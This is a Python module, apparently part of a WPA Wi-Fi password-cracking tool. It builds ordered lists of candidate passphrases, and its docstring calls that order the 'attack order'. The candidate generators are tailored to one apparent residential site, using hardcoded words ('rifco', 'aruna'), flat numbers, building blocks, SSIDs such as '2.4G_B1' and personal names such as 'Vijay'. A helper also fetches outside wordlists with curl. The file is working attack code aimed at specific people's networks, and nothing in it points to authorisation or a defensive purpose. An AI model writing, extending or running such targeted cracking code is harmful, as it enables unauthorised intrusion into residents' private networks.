"""wordlists.py - candidate generation. Pure functions (no radio, no disk
except fetch/merge helpers). Order of the returned lists IS the attack order.
"""
import itertools
import subprocess
from .config import MIN_PSK_LEN, MAX_PSK_LEN

HINT_WORDS = ["rifco", "aruna", "Rifco", "Aruna", "RIFCO", "ARUNA"]
HINT_FLATS = [str(n) for n in (101, 102, 103, 104, 105, 106, 401, 402, 403, 404, 405, 406)]
HINT_BLOCKS = ["b1", "b2", "b3", "b4", "B1", "B2", "B3", "B4"]
HINT_SEPS = ["_", "-"]

B1_SSIDS = ["2.4G_B1", "5G_B1", "B1", "b1", "2.4G", "5G"]
B1_SUFFIXES = ["123", "1234", "12345", "123456", "@123", "#123", "@1234", "2023",
               "2024", "2025", "007", "111", "000", "321", "999", "01",
               "101", "102", "103", "104", "105", "106",
               "401", "402", "403", "404", "405", "406"]


def _valid(cands):
    seen, out = set(), []
    for c in cands:
        if MIN_PSK_LEN <= len(c) <= MAX_PSK_LEN and c not in seen:
            seen.add(c)
            out.append(c)
    return out


def hint_candidates(words=HINT_WORDS, flats=HINT_FLATS, blocks=HINT_BLOCKS):
    """Site-hint combos: word+flat, seps, blocks. Most-likely first."""
    ordered = []

    def add(c):
        if MIN_PSK_LEN <= len(c) <= MAX_PSK_LEN and c not in ordered:
            ordered.append(c)

    for w, f in itertools.product(words, flats):
        add(f"{w}{f}")
        add(f"{f}{w}")
    for w, f, s in itertools.product(words, flats, HINT_SEPS):
        add(f"{w}{s}{f}")
        add(f"{f}{s}{w}")
    for b, w, f in itertools.product(blocks, words[:2], flats):
        add(f"{b}{w}{f}")
    for b, f in itertools.product(blocks, flats):
        add(f"{b}{f}")
    for w in words:
        for s in ["123", "1234", "@123", "#123", "2024", "2025", "007", "01"]:
            add(f"{w}{s}")
    for w in ["Actyoga", "actyoga", "Vijay", "vijay"]:
        for h in ["rifco", "aruna", "Rifco", "Aruna"]:
            add(f"{w}{h}")
            add(f"{h}{w}")
            add(f"{w}_{h}")
            add(f"{w}123{h}")
    return ordered


def mangle(ssids=B1_SSIDS, suffixes=B1_SUFFIXES, cross_words=("rifco", "aruna", "Rifco", "Aruna"),
           cross_ssids=("2.4G_B1", "5G_B1", "B1")):
    """SSID-derived candidates: ssid+suffix and cross with hint words."""
    ordered = []

    def add(c):
        if MIN_PSK_LEN <= len(c) <= MAX_PSK_LEN and c not in ordered:
            ordered.append(c)

    for s in ssids:
        for suf in suffixes:
            add(f"{s}{suf}")
            add(f"{s}_{suf}")
            add(f"{s}-{suf}")
    for a, b in itertools.product(cross_words, cross_ssids):
        add(f"{a}{b}")
        add(f"{b}{a}")
        add(f"{a}_{b}")
    return ordered


def merge(*lists):
    """Ordered union with WPA length filter. First list wins on duplicates."""
    return _valid([c for lst in lists for c in lst])


def fetch_lines(url, timeout=60):
    """Download a wordlist over the management uplink. Returns [] offline."""
    try:
        r = subprocess.run(["curl", "-sL", "--max-time", str(timeout), url],
                           capture_output=True, text=True, timeout=timeout + 10)
        if r.returncode != 0:
            return []
        return [ln.strip() for ln in (r.stdout or "").splitlines() if ln.strip()]
    except Exception:
        return []


def filter_lengths(lines):
    return [ln for ln in lines if MIN_PSK_LEN <= len(ln) <= MAX_PSK_LEN]
